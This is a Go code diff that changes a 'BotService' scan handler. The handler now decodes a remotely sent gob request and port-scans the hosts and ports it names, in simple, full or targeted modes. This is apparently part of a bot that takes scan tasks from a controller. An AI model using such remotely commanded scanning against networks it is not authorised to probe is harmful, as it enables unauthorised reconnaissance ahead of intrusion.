@@ -1,6 +1,8 @@
 package tcp
 
 import (
+	"bytes"
+	"encoding/gob"
 	"fmt"
 	"log"
 
@@ -9,7 +11,22 @@ import (
 
 //HandleScan is
 func (b *BotService) HandleScan(payload []byte) {
-	resCh := b.PortScanner.SimpleScan([]string{"127.0.0.1"})
+	req := new(scanRequest)
+	if err := gob.NewDecoder(bytes.NewReader(payload)).Decode(req); err != nil {
+		log.Println("handling scan", err)
+		return
+	}
+
+	var resCh <-chan string
+	switch req.Type {
+	case "scan":
+		resCh = b.PortScanner.Scan(req.Hosts, req.Ports)
+	case "simple":
+		resCh = b.PortScanner.SimpleScan(req.Hosts)
+	case "full":
+		resCh = b.PortScanner.FullScan(req.Hosts)
+	}
+
 	var res []string
 	for addr := range resCh {
 		fmt.Println("addr found", addr)
